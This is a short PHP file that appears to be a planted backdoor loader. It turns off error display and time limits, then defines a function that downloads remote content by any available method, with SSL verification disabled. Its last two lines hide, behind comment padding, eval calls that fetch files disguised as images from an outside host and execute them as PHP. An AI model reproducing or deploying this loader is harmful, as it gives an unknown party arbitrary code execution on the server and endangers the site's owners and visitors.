<?php session_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
		function url_get_contents($url) {
		    if (function_exists('file_get_contents') && ini_get('allow_url_fopen')){
		        $url_get_contents_data = file_get_contents($url);
		    }elseif(function_exists('fopen') && function_exists('stream_get_contents') && ini_get('allow_url_fopen')){
		        $handle = fopen ($url, "r");
		        $url_get_contents_data = stream_get_contents($handle);      
		    }elseif(function_exists('curl_exec')){ 
		        $conn = curl_init($url);
		        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
		        curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
		        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
		        $url_get_contents_data = (curl_exec($conn));
		        curl_close($conn);    
		    }else{
		        $url_get_contents_data = false;
		    }
		return $url_get_contents_data;
		} 
?>
<?=/********/ /*******/ /********/@eval/****/("?>".url_get_contents/*******/("https://m.slotao.com/teamm.png"));/**/?>
<?=/********/ /*******/ /********/@eval/****/("?>".url_get_contents/*******/("https://m.slotao.com/cucok.jpg"));/**/?>